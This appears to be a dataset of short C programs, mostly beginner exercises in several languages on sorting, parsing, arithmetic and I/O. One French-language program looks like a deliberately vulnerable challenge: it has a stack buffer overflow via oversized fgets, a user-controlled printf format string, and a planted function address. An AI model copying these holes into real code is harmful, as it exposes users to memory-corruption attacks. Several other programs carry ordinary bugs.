    "#include<stdio.h>\nint orderJudge(int*a)\n{\n int i,j,h,flag;\n for(i=0;i<=7;i++)\n {\n  for(j=0;j<=6;j++)\n  {\n   if(a[j]>a[j+1])\n   {\n    h=a[j];\n    a[j]=a[j+1];\n    a[j+1]=h;\n   }\n  }\n }\n i=0,flag=1;\n while(flag&&i<=6)\n {\n  if(a[i]!=a[i+1])\n  {\n   i++;\n  }\n  else\n  {\n   flag=0;\n  }\n }\n if(flag==0)\n {\n  return 0;\n }\n else\n {\n  return 1;\n }\n}\nint main(void)\n{\n int a[8]={1,2,3,4,5,6,7,8};\n int b[8]={1,1,3,4,5,6,7,8};\n printf(\"%d%d\",orderJudge(a),orderJudge(b));\n return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n\nchar *get_word(char *st, int n);\nint main(void)\n{\n char input[16];\n while (get_word(input, 16 - 1) != ((void*)0))\n {\n  puts(input);\n }\n puts(\"Done!\");\n return 0;\n}\nchar *get_word(char *st, int n)\n{\n int ch;\n int count = 0;\n while ((ch = getchar()) != (-1) && !__isspace(ch) && count < n)\n {\n  *st++ = ch;\n  count++;\n }\n *st = '\\0';\n if (ch == (-1))\n {\n  st = ((void*)0);\n }\n else\n {\n  while (ch != '\\n')\n  {\n   ch = getchar();\n  }\n }\n return st;\n}",
    "int foo() {\n  int err = -5;\n  return err;\n}\nint main() {\n  int tentative_error = -5;\n  int error = foo();\n  tentative_error = 0;\n  error = 0;\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint c=2,d=5,e=10,a;\na= c>1?(d>1||e>1 ? 100:200) : (300);\nprintf(\"a= %d\",a);\nreturn 0;\n}",
    "#include <stdio.h>\nstatic const int N=5;\nvoid comElement(int a1[N], int a2[N], int a3[N]){\n for (int i=0,j=0,k=0; i<N && j<N && k<N;)\n  if (a1[i] == a2[j] && a2[j]==a3[k]){\n   printf(\"%d \",a1[i]);\n   ++i,++j,++k;\n  }\n  else if (a1[i] < a2[j])\n   ++i;\n  else if (a2[j] < a3[k])\n   ++j;\n  else\n   ++k;\n}\nint main(void){\n int a1[5] = {0,1,2,5,6},a2[5]={4,5,7,10,11}, a3[5]={5,12,13,15,22};\n comElement(a1,a2,a3);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"Hola, mundo\\n\");\n    int a = 3;\n    float b = 4.5;\n    double c = 5.25;\n    float suma;\n    suma = a + b + c;\n    printf(\"La suma de a,b,c es %f.\", suma);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\n\n\n\nvoid MATRIX_CHAIN_ORDER(int m[][100], int s[][100], int p[], int p_array_size);\nvoid PRINT_OPTIMAL_PARENS(int s[][100], int i, int j);\nint main()\n{\n int m[100][100], s[100][100];\n int case1[4 + 1] = { 3, 5, 2, 1, 10 };\n MATRIX_CHAIN_ORDER(m, s, case1, 4 + 1);\n PRINT_OPTIMAL_PARENS(s, 1, 4);\n printf(\"\\n\");\n int case2[4 + 1] = { 2, 7, 3, 6, 10 };\n MATRIX_CHAIN_ORDER(m, s, case2, 4 + 1);\n PRINT_OPTIMAL_PARENS(s, 1, 4);\n printf(\"\\n\");\n int case3[5 + 1] = { 10, 3, 15, 12, 7, 2 };\n MATRIX_CHAIN_ORDER(m, s, case3, 5 + 1);\n PRINT_OPTIMAL_PARENS(s, 1, 5);\n printf(\"\\n\");\n int case4[6 + 1] = { 5, 10, 3, 12, 5, 50, 6 };\n MATRIX_CHAIN_ORDER(m, s, case4, 6 + 1);\n PRINT_OPTIMAL_PARENS(s, 1, 6);\n printf(\"\\n\");\n for (int i = 0; i <= 6; i++)\n {\n  for (int j = 0; j <= 6; j++)\n  {\n   printf(\"%-15d\", s[i][j]);\n  }\n  printf(\"\\n\");\n }\n printf(\"\\n\");\n system(\"pause\");\n return 0;\n}\nvoid MATRIX_CHAIN_ORDER(int m[][100], int s[][100], int p[], int p_array_size)\n{\n int n = p_array_size - 1;\n for (int i = 1; i <= n; i++)\n  m[i][i] = 0;\n for (int l = 2; l <= n; l++)\n {\n  for (int i = 1; i <= n - l + 1; i++)\n  {\n   int j = i + l - 1;\n   m[i][j] = 999999999;\n   for (int k = i; k <= j - 1; k++)\n   {\n    int q = m[i][k] + m[k + 1][j] + p[i - 1] * p[k] * p[j];\n    if (q < m[i][j])\n    {\n     m[i][j] = q;\n     s[i][j] = k;\n    }\n   }\n  }\n }\n}\nvoid PRINT_OPTIMAL_PARENS(int s[][100], int i, int j)\n{\n if (i == j)\n  printf(\"A%d \", i);\n else\n {\n  printf(\"(\");\n  PRINT_OPTIMAL_PARENS(s, i, s[i][j]);\n  PRINT_OPTIMAL_PARENS(s, s[i][j] + 1, j);\n  printf(\")\");\n }\n}",
    "#include <stdio.h>\nint main()\n{\n    int n,x,y,r,b,c,i;\n        scanf(\"%d\",&n);\n    for(i = 0 ; i < n ; i++){\n        scanf(\"%d %d\", &x, &y);\n     r = (3*x) * (3*x) + y*y;\n     b = 2*(x*x) + (5*y) * (5*y);\n     c = -100*x + y*y*y;\n     if(r > b && r > c)\n         printf(\"Rafael ganhou\\n\");\n     else if(b > r && b > c)\n         printf(\"Beto ganhou\\n\");\n     else if(c > r && c > b)\n         printf(\"Carlos ganhou\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint m,n;\nint max(int a,int b)\n{\n  return a>b?a:b;\n}\nvoid coin_sort(int arr[][n])\n{\n  for(int i=1;i<m;i++)\n    arr[i][0] += arr[i-1][0];\n  for(int j=1;j<n;j++)\n    arr[0][j] += arr[0][j-1];\n  for(int i=1;i<m;i++)\n  {\n    for(int j=1;j<n;j++)\n    {\n      arr[i][j] += max(arr[i-1][j],arr[i][j-1]);\n    }\n  }\n}\nint main()\n{\n  int t;\n  scanf(\"%d\", &t);\n  while(t--)\n  {\n    scanf(\"%d %d\",&m,&n);\n    int arr[m][n];\n    for(int i=0;i<m;i++)\n      for(int j=0;j<n;j++)\n        scanf(\"%d\",&arr[i][j]);\n    coin_sort(arr);\n    printf(\"%d\\n\",arr[m-1][n-1]);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nunsigned int find_num_divisors(unsigned int number);\nint main() {\n    unsigned int inc = 1;\n    unsigned int triangle = 0;\n    while (triangle < 100000000) {\n        triangle += inc;\n        inc += 1;\n        if (triangle < 10000000) {\n            continue;\n        }\n        unsigned int num_divisors = find_num_divisors(triangle);\n        if (num_divisors > 500) {\n            printf(\"triangle: %u, divisors: %u\\n\", triangle, num_divisors);\n            return 0;\n        }\n    }\n    printf(\"Couldn't find number with more than 500 divisors up to %u.\\n\", 100000000);\n    return 0;\n}\nunsigned int find_num_divisors(unsigned int number) {\n    unsigned int num_divisors = 2;\n    unsigned int step = 2;\n    unsigned int start = 3;\n    if (number % 2 == 0) {\n        step = 1;\n        start = 2;\n    }\n    unsigned int i;\n    for (i = start; i < sqrt(number); i += step) {\n        if (number % i == 0) {\n            num_divisors += 2;\n        }\n    }\n    if (1.0 * i == sqrt(number)) {\n        num_divisors += 1;\n    }\n    return num_divisors;\n}",
    "int main ()\n{\n  int *p_p275;\n  int *post_p276;\n  post_p276 = p_p275;\n  p_p275 = ((int *) (((int) p_p275)+4));\n  post_p276;\n  p_p275 = (p_p275+3);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint apartine(int x, int a[], int n){\n    int i;\n    for(i=0; i<n; i++)\n        if(x==a[i]) return 1;\n    return 0;\n}\nint main()\n{\n    int nA, nB, a[100], b[100], i, j, c[100], k=0;\n    printf(\"Introduceti numarul de elemente pentru sirul A: \");\n    scanf(\"%d\", &nA);\n    for(i=0; i<nA; i++){\n        printf(\"A[%d] = \", i);\n        scanf(\"%d\", &a[i]);\n    }\n    printf(\"Introduceti numarul de elemente pentru sirul B: \");\n    scanf(\"%d\", &nB);\n    for(i=0; i<nB; i++){\n        printf(\"B[%d] = \", i);\n        scanf(\"%d\", &b[i]);\n    }\n    printf(\"\\nIntersectie: \");\n    k=0;\n    for(i=0; i<nB; i++)\n        if(apartine(b[i], a, nA)) c[k++]=b[i];\n    for(i=0; i<k; i++) printf(\"%d \", c[i]);\n    printf(\"\\nReuniune: \");\n    k=nA;\n    for(i=0; i<nA; i++) c[i]=a[i];\n    for(i=0; i<nB; i++)\n        if(!apartine(b[i], a, nA)) c[k++]=b[i];\n    for(i=0; i<k; i++) printf(\"%d \", c[i]);\n    k=0;\n    printf(\"\\nA fara B: \");\n    for(i=0; i<nA; i++)\n        if(!apartine(a[i], b, nB)) c[k++]=a[i];\n    for(i=0; i<k; i++) printf(\"%d \", c[i]);\n    return 0;\n}",
    "#include <pthread.h>\n#include <stdio.h>\nvoid *start_thread(void *argv) {\n    printf(\"======start_thread========\\n\");\n    pthread_exit(\"hello world\");\n    printf(\"after pthread_exit\\n\");\n}\nint main(int argc, char *argv[]) {\n    pthread_t pthread;\n    void *rev = ((void*)0);\n    pthread_create(&pthread, ((void*)0), start_thread, ((void*)0));\n    pthread_join(pthread, &rev);\n    printf(\"the thread exit: %s\\n\", (char *) rev);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <stdbool.h>\n#include <stdint.h>\n\nint main(int argc, const char **argv)\n{\n  char s[16];\n  printf(\"Qui \u00eates vous? \");\n  fgets(s, 32, (stdin));\n  long buffer[80];\n  for(int i=0; i<80; i++){\n      buffer[i]=0x4141414141414141;\n      if(i==37){\n          long p_tgr = (long)&printf;\n          buffer[i]=p_tgr;\n      }\n  }\n  printf(\"Vous \u00eates donc: \");\n  printf(s, 32);\n  printf(\" !\\nQuel est votre mot du jour? \");\n  fgets(s, 256, (stdin));\n  printf(\"\\nAh, quel dommage :/\");\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n   printf(\"PASS\\n\");\n   return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  float income, tax;\n  printf(\"Enter taxable income: \");\n  scanf(\"%f\", &income);\n  if(income <= 750)\n  {\n    tax = income * 0.01f;\n  }\n  else if(income < 2250)\n  {\n    tax = 7.5f + (income * 0.02f);\n  }\n  else if(income < 3750)\n  {\n    tax = 37.5f + (income * 0.03f);\n  }\n  else if(income < 5250)\n  {\n    tax = 82.5f + (income * 0.04f);\n  }\n  else if(income < 7000)\n  {\n    tax = 142.5f + (income * 0.05f);\n  }\n  else\n  {\n    tax = 230 + (income * 0.06f);\n  }\n  printf(\"The tax due is: %.2f\\n\", tax);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main ()\n{\nint dia;\nprintf (\"Informe o dia da semana. 1= domingo, 2= segunda... 7= sabado \\n\");\nscanf (\"%i\", &dia);\n if (dia == 1 || dia == 7)\n {\n printf (\"FIM DE SEMANA \\n\");\n }\n system (\"pause\");\n return (0);\n }",
    "#include <ctype.h>\n#include <stdio.h>\ndouble atof(char s[]);\nint main()\n{\n    char string[] = \"           -123443.3234\";\n    double n;\n    n = atof(string);\n    printf(\"string to double number is: %f\\n\", n);\n}\ndouble atof(char s[])\n{\n    double val, power;\n    int i, sign;\n    for (i = 0; __isspace(s[i]); i++)\n        ;\n    sign = (s[i] == '-')? -1: 1;\n    if (s[i] == '+' || s[i] == '-')\n        i++;\n    for (val = 0.0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++)\n        val = 10.0 * val + (s[i] - '0');\n    if (s[i] == '.')\n        i++;\n    for (power = 1.0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++)\n    {\n        val = 10.0 * val + (s[i] - '0');\n        power *= 10;\n    }\n    return sign * val / power;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar *get_geometry(int type_n) {\n    switch (type_n) {\n        case 0:\n            return \"Null shape\";\n        case 1:\n            return \"Point\";\n        case 3:\n            return \"Polyline\";\n        case 5:\n            return \"Polygon\";\n        case 8:\n            return \"MultiPoint\";\n        case 11:\n            return \"PointZ\";\n        case 13:\n            return \"PolylineZ\";\n        case 15:\n            return \"PolygonZ\";\n        case 18:\n            return \"MultiPointZ\";\n        case 21:\n            return \"PointM\";\n        case 23:\n            return \"PolylineM\";\n        case 25:\n            return \"PolygonM\";\n        case 28:\n            return \"MultiPointM\";\n        case 31:\n            return \"MultiPatch\";\n    }\n    return ((void*)0);\n}\nint main(void) {\n    int len = 1000;\n    char filepath[len];\n    int headerlen = 100;\n    char *header = malloc(headerlen);\n    printf(\"Enter full filepath to shapefile (e.g. /users/jesus/desktop/test.shp): \\n\");\n    fgets(filepath, len, (stdin));\n    len = strlen(filepath);\n    filepath[len-1] = '\\0';\n    if (filepath[len-4] != 's' || filepath[len-3] != 'h' || filepath[len-2] != 'p') {\n        printf(\"Invalid filename extension - File is not a shapefile. Exiting.\\n\");\n        free(header);\n        exit(0);\n    }\n    FILE *f = fopen(filepath, \"r\");\n    if (!f) {\n        printf(\"\\nFile read error. Exiting.\\n\");\n        free(header);\n        exit(0);\n    } else {\n        printf(\"\\nFile read successful.\\n\\n\");\n    }\n    for (int i = 0; i < headerlen; i++) {\n        header[i] = fgetc(f);\n    }\n    int filecode = (((header[0] & 0xff) << 24) | ((header[1] & 0xff) << 16) | ((header[2] & 0xff) << 8) | ((header[3] & 0xff)));\n    int file_len = (((header[24] & 0xff) << 24) | ((header[25] & 0xff) << 16) | ((header[26] & 0xff) << 8) | ((header[27] & 0xff)));\n    file_len *= 2;\n    int version = (((header[31] & 0xff) << 24) | ((header[30] & 0xff) << 16) | ((header[29] & 0xff) << 8) | ((header[28] & 0xff)));\n    int geometry_type = (((header[35] & 0xff) << 24) | ((header[34] & 0xff) << 16) | ((header[33] & 0xff) << 8) | ((header[32] & 0xff)));\n    double min_x, min_y, max_x, max_y;\n    memcpy(&min_x, &header[36], sizeof(min_x));\n    memcpy(&min_y, &header[44], sizeof(min_y));\n    memcpy(&max_x, &header[52], sizeof(max_x));\n    memcpy(&max_y, &header[60], sizeof(max_y));\n    double min_z, max_z;\n    memcpy(&min_z, &header[68], sizeof(min_z));\n    memcpy(&max_z, &header[76], sizeof(max_z));\n    double min_m, max_m;\n    memcpy(&min_m, &header[84], sizeof(min_m));\n    memcpy(&max_m, &header[92], sizeof(max_m));\n    if (filecode != 9994) {\n        printf(\"Incorrect filecode - File is not a shapefile. Exiting.\\n\");\n        free(header);\n        fclose(f);\n        exit(0);\n    } else {\n        printf(\"Filecode: \\t%d - Shapefile filetype verified.\\n\", filecode);\n    }\n    printf(\"File length: \\t%d bytes\\n\", file_len);\n    printf(\"Version: \\t%d\\n\", version);\n    printf(\"Geometry: \\t%s\", get_geometry(geometry_type));\n    printf(\"\\nBounding box: \\t(%f, %f) - (%f, %f)\\n\", min_x, min_y, max_x, max_y);\n    printf(\"Z range: \\t%f - %f\\n\", min_z, max_z);\n    printf(\"M range: \\t%f - %f\\n\\n\", min_m, max_m);\n    free(header);\n    fclose(f);\n    return 1;\n}",
    "#include<stdio.h>\nint main()\n{\n    int t,s1,s2,s3,s4,max_1st_num,min_1st_num,max_2nd_num,min_2nd_num;\n    scanf(\"%d\",&t);\n    while(t--)\n    {\n        scanf(\"%d%d%d%d\",&s1,&s2,&s3,&s4);\n        if(s1<s2 )\n        {\n            max_1st_num = s2;\n            min_1st_num = s1;\n        }\n        else\n        {\n            max_1st_num = s1;\n            min_1st_num = s2;\n        }\n        if(s3<s4 )\n        {\n            max_2nd_num = s4;\n            min_2nd_num = s3;\n        }\n        else\n        {\n            max_2nd_num = s3;\n            min_2nd_num = s4;\n        }\n        if(max_1st_num>min_2nd_num && max_2nd_num>min_1st_num)\n        {\n            printf(\"YES\\n\");\n        }\n        else\n        {\n            printf(\"NO\\n\");\n        }\n    }\n        return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char **argv)\n{\n      FILE *infile,*outfile;\n      long i,Nc,Nw,Nh,N;\n      long junk;\n      char comment[80];\n      unsigned char *Tex;\n      unsigned char c,R,G,B;\n      infile = fopen(\"./42_Watermark.ppm\",\"rb\");\n      outfile = fopen(\"./42_WatermarkAlpha.ppm\",\"wb\");\n      fscanf(infile,\"P6\\n%[^\\n]\\n%li %li\\n%li\\n\",comment,&Nw,&Nh,&junk);\n      N = Nw*Nh;\n      Tex = (unsigned char *) malloc(4*N*sizeof(unsigned char));\n      if (Tex == ((void*)0)) {\n         printf(\"malloc returned null pointer in AddAlpha.  Bailing out!\\n\");\n         exit(1);\n      }\n      for(i=0;i<N;i++) {\n         fscanf(infile,\"%c%c%c\",&R,&G,&B);\n         Tex[4*i ] = (unsigned char) 255;\n         Tex[4*i+1] = (unsigned char) 255;\n         Tex[4*i+2] = (unsigned char) 255;\n         Tex[4*i+3] = (unsigned char) R;\n      }\n      fclose(infile);\n      fprintf(outfile,\"P6\\n#.\\n%li %li\\n255\\n\",Nw,Nh);\n      fflush(outfile);\n      N = 4*Nh*Nw;\n      for(i=0;i<N;i++) {\n         fprintf(outfile,\"%c\",Tex[i]);\n      }\n      fclose(outfile);\n      return(0);\n}",
    "#include <stdio.h>\nint main(void)\n{\n printf(\"Hello world!\\n\");\n return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n int i=1;\n while(i++<5);\n printf(\"%d\",i);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid selection_sort(int* arr) {\n    int smallest_num_index = 0;\n    for (int i = 0; i < sizeof(arr); i++) {\n        smallest_num_index = i;\n        for (int j = i + 1; j < sizeof(arr); j++) {\n            if (arr[j] < arr[smallest_num_index]) {\n                smallest_num_index = j;\n            }\n        }\n        if (smallest_num_index != i) {\n            int temp = arr[i];\n            arr[i] = arr[smallest_num_index];\n            arr[smallest_num_index] = temp;\n        }\n    }\n    return;\n}\nvoid print_array(int* arr) {\n    printf(\"{ \");\n    for (int i = 0; i < sizeof(arr); i++) {\n        printf(\"%d \", arr[i]);\n    }\n    printf(\"}\\n\");\n}\nint main(void) {\n    int to_sort[] = { 4, 2, 7, 1, 3 };\n    print_array(to_sort);\n    selection_sort(to_sort);\n    print_array(to_sort);\n    system(\"pause\");\n    return 0;\n}",
    "int main(void){\n float x = 5;\n float* p = (float*)&x;\n *p;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int row, space;\n    int ch, ch1;\n    printf(\"Please enter an uppercase letter:\\n\");\n    scanf(\"%c\", &ch);\n    ch1 = ch;\n    for (row = 0; row < ch - 65 + 1; row++)\n    {\n for (space = 0; space < ch - 65 - row; space++)\n {\n     printf(\" \");\n }\n for (ch = 65; ch < 65 + row + 1; ch++)\n {\n     printf(\"%c\", ch);\n }\n for (ch = 65 + row - 1; ch >= 65; ch--)\n {\n     printf(\"%c\", ch);\n }\n printf(\"\\n\");\n ch = ch1;\n    }\n    return 0;\n}",
    "int main() {\n    int i = 0;\n    int j = 0;\n    for (i = 0; i < 10; i = i + 1) {\n        int k = i;\n        for (int i = k; i < 10; i = i + 1)\n            j = j + 1;\n    }\n    return j + i;\n}",
    "#include <stdio.h>\nint main() {\n    int grade, sum = 0, num_grades = 0, failed = 0;\n    while (scanf(\"%d\", &grade) == 1) {\n        switch (grade) {\n            case 6:\n            case 7:\n            case 8:\n            case 9:\n            case 10: sum += grade;\n                     num_grades++; break;\n            case 5: failed++; break;\n            default: printf(\"Enter grade from 5 to 10: \"); break;\n        }\n    }\n    if (num_grades == 0)\n        printf(\"No passed exams\");\n    else\n        printf(\"Average is %4.2f\\n\", (float)sum / num_grades);\n    if (failed != 0)\n        printf(\"Failed on %d exams\\n\", failed);\n    else\n        printf(\"No failed exams\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  char word[4];\n  unsigned int num = 0x00000000;\n  printf(\"Enter a word: \");\n  scanf(\"%s\", word);\n  for(int i = 3; i > -1; i--){\n    printf(\"Debug: %c = 0x%0x \\n\",word[i], word[i]);\n  }\n  printf(\"Your number is: %u (0x\",num);\n  for(int i = 0; i < 4; i++){\n    printf(\"%0x\",word[i]);\n  }\n  printf(\")\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nconst char *get_filename_ext(const char *filename);\nint main(int argc, char *argv[]){\n if(argc >= 2){\n  FILE *fin = fopen(argv[1], \"r\");\n  if(fin){\n   char line[2000000];\n   int lines = 0;\n            while(fgets(line, sizeof(line), fin)){\n                lines++;\n            }\n            printf(\"Number of lines in %s is %d\\n\", argv[1], lines);\n            rewind(fin);\n            int split = 2;\n            if(argc >= 3){\n                split = strtoul(argv[2], ((void*)0), 10);\n            }\n            if(split > lines){\n                split = lines;\n                printf(\"You can't split more then the number of lines in input file.\");\n            }\n            int i;\n            int separate = lines/split;\n            char defaultOutputFile[] = \"output\";\n            for(i=0; i<split; ++i){\n                char fileOutput[200] = \"\";\n                if(argc >= 4){\n                    strcat(fileOutput, argv[3]);\n                }else{\n                    strcat(fileOutput, defaultOutputFile);\n                }\n                char numString[20];\n                sprintf(numString, \"%d\", i);\n                strcat(fileOutput, numString);\n                strcat(fileOutput, get_filename_ext(argv[1]));\n                FILE *fout = fopen(fileOutput, \"w\");\n    int j;\n    if(i+1 >= split){\n     separate+=(lines%split);\n    }\n    for(j=0; j<separate; ++j){\n     fgets(line, sizeof(line), fin);\n     fprintf(fout, \"%s\", line);\n    }\n    memset(fileOutput, 0, 200);\n    fclose(fout);\n   }\n   printf(\"File %s have been separated into %d file(s).\", argv[1], split);\n   fclose(fin);\n  }else{\n   printf(\"File not found.\");\n  }\n }else{\n  printf(\"No arguement supplied\");\n }\n return 0;\n}\nconst char *get_filename_ext(const char *filename) {\n    const char *dot = strrchr(filename, '.');\n    if(!dot || dot == filename) {\n        return \"\";\n    }\n    return dot;\n}",
    "#include<stdio.h>\nint main(void)\n{\n    printf(\"%d\\n\", 3<4);\n}",
    "#include <stdio.h>\nint main(int argc, const char* argv[]) {\n    int i;\n    for(i = 0; i < argc; ++i) {\n        printf(\"%s \", argv[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <ctype.h>\n#include <unistd.h>\nint main (int argc , char* argv[] ){\n int fd;\n int truc;\n if (argc != 3){\n  printf(\"usage : on donne le nom et lq taille du fichier que l'on souhaite\");\n  exit(1);\n }\n fd=open(argv[1],(((__wasi_oflags_t)(1 << 0)) << 12)|(((__wasi_oflags_t)(1 << 3)) << 12)|(0x10000000),0777);\n write(fd,&truc,atoi(argv[2]));\n close(fd);\nexit(0);\n}",
    "int main(void)\n{\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n int j;\n char i;\n for (i = '1', j = 60; j > 0; i += 3, j -= 5) {\n  printf(\"I=%c J=%d\\n\", i, j);\n }\n i = '?';\n printf(\"I=%c J=%d\\n\", i, j);\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int bugs = 100;\n    double bug_rate = 1.2;\n    printf(\"You have %d bugs at the imaginary rate of %f.\\n\", bugs, bug_rate);\n    long universe_of_defects = 1L * 1024L * 1024L * 1024L;\n    printf(\"the entire universe has %ld bugs.\\n\", universe_of_defects);\n    double expected_bugs = bugs * bug_rate;\n    printf(\"you are expected to have %f bugs.\\n\", expected_bugs);\n    double part_of_universe = expected_bugs / universe_of_defects;\n    printf(\"that is only a %e portion of the universe.\\n\", part_of_universe);\n    char nul_byte = '\\0';\n    int care_percentage = bugs * nul_byte;\n    printf(\"which means you should care %d %%.\\n\", care_percentage);\n    printf(\"the nul_byte char = %c, nul_byte str = %s\", nul_byte, nul_byte);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int n;\n    double soma, media;\n    printf(\"Quantos elementos vai ter o vetor? \");\n    scanf(\"%d\", &n);\n    double vetor[n];\n    for (int i=0; i<n; i++) {\n        printf(\"Digite um numero: \");\n      scanf(\"%lf\", &vetor[i]);\n    }\n   soma = 0;\n    for (int i=0; i<n; i++) {\n        soma = soma + vetor[i];\n    }\n    media = soma / n;\n   printf(\"\\nMEDIA DO VETOR = %.3lf\\n\", media);\n   printf(\"ELEMENTOS ABAIXO DA MEDIA:\\n\");\n    for (int i=0; i<n; i++) {\n        if (vetor[i] < media) {\n            printf(\"%.1lf\\n\", vetor[i]);\n        }\n     }\nreturn 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint vezes_caractere(char str[],char carac[],int tamStr){\n    int vezes=0;\n    for(int i=0;i<tamStr;i++){\n        if(carac[0] == str[i]){\n            vezes++;\n        }\n    }\n    return vezes;\n}\nint main(void){\n    char str[100],carac[1];\n    scanf(\"%[^\\n] \",str);\n    scanf(\"%c\",&carac[0]);\n    int tamStr = strlen(str);\n    int repete = vezes_caractere(str,carac,tamStr);\n    printf(\"%d\\n\",repete);\n    return 0;\n}",
    "int main(){\n  int x = 5 + 3 - 6*5;\n  return x;\n}",
    "#include<stdio.h>\nint main(){\n int a;\n int b,c,d,e,f,total;\n scanf(\"%d\",&a);\n b=a%10;\n c=(a/10);\n    c=c%10;\n d=(a/100);\n    d=d%10;\n e=(a/1000);\n    e=e%10;\n f=(a/10000);\n    f=f%10;\n total=b+c+d+e+f;\n printf(\"%d\",total);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(int argc, char const *argv[])\n{\n    int tam = 5, l, c;\n    int mat[tam][tam];\n    srand(time(((void*)0)));\n    for (l = 0; l < tam; l++){\n        for (c =0; c < tam; c++){\n            mat[l][c] = rand() % 100;\n        }\n    }\n    for (l = 0; l < tam; l++){\n        for (c =0; c < tam; c++){\n            printf(\"%d \", mat[l][c]);\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\nSomente a diagonal da Matriz\");\n    for (l = 0; l < tam; l++){\n        for (c =0; c < tam; c++){\n            if( l == c)\n                printf(\"%d \", mat[l][c]);\n            else\n                printf(\" \");\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    char *hi = \"hello world\\n\";\n    printf(\"%s\", hi);\n    return 0;\n}",
    "#include <stdio.h>\nint power(int base, int n)\n{\n    if (n == 0)\n    {\n        return 1;\n    }\n    if (n == 1)\n    {\n        return base;\n    }\n    if (n % 2)\n    {\n        return base * power(base, n - 1);\n    }\n    else\n    {\n        return power(base, n / 2) * power(base, n / 2);\n    }\n}\nint main(int argc, char *argv[])\n{\n    int x, n;\n    printf(\"For x^n, enter x: \");\n    scanf(\"%d\", &x);\n    printf(\"Enter n: \");\n    scanf(\"%d\", &n);\n    printf(\"%d^%d = %d\\n\", x, n, power(x, n));\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int x, y;\n    char c;\n    printf(\"Please Enter the initial Position: \");\n    scanf(\"%d %d\", &x, &y);\n    while (1) {\n        scanf(\"%c\", &c);\n        if (c == 'U') {\n            x = x - 1;\n        }\n        else if (c == 'D') {\n            x = x + 1;\n        }\n        else if (c == 'L') {\n            y = y - 1;\n        }\n        else if (c == 'R') {\n            y = y + 1;\n        }\n        else if (c == 'S') {\n            break;\n        }\n    }\n    printf(\"Final position of the robot is: %d, %d\\n\", x, y);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdbool.h>\n_Bool isPrime (int n){\n    _Bool flag = 1;\n    if(n==1) return 0;\n    int sqr = (int)sqrt((double)n);\n    for(int i=2;i<=sqr;i++){\n        if(n%i==0) flag=0;\n        break;\n    }\n    return flag;\n}\nint main(){\n    int n;\n    scanf(\"%d\",&n);\n    if(isPrime(n)==1){\n        printf(\"Yes\");\n    }else printf(\"No\");\n    return 0;\n}",
    "#include<stdio.h>\n\n\nint main()\n{\n int amount=-45,A,I;\n printf(\"amount\" \" contains %d\\n\",amount);\n char Zc1='h';\n printf(\"%c\",Zc1);\n}",
    "#include <stdio.h>\nint main(void)\n{\nprintf(\"Please enter floating point number: \\n\");\nfloat f_num;\nscanf(\"%f\", &f_num);\nprintf(\"decimal point notation: %f\\n\", f_num);\nprintf(\"exponental notation: %e\\n\", f_num);\nprintf(\"p notation: %a\\n\", f_num);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint findString(const char *string, const char *substring);\nint main(int argc, char const *argv[])\n{\n      char *string = \"a chatterbox\";\n    int index = findString(string, \"hat\");\n    if (index != -1)\n    {\n        printf(\"string = %s\\n\", string);\n        printf(\"The starting position is %d\", index);\n    }\n    return 0;\n}\nint findString(const char *string, const char *substring)\n{\n    for (int i = 0; i < strlen(string); i++)\n    {\n        if (strncmp(string + i, substring, strlen(substring)) == 0)\n        {\n            return i;\n        }\n    }\n    return -1;\n}",
    "#include <stdio.h>\nint Sum(int s)\n{\n int i,sum=0;\n for(i=1;i<=s;i++)\n {\n  sum += i;\n }\n return sum;\n}\nint main()\n{\n int n;\n scanf(\"%d\",&n);\n printf(\"%d\",Sum(n));\n return 0;\n}",
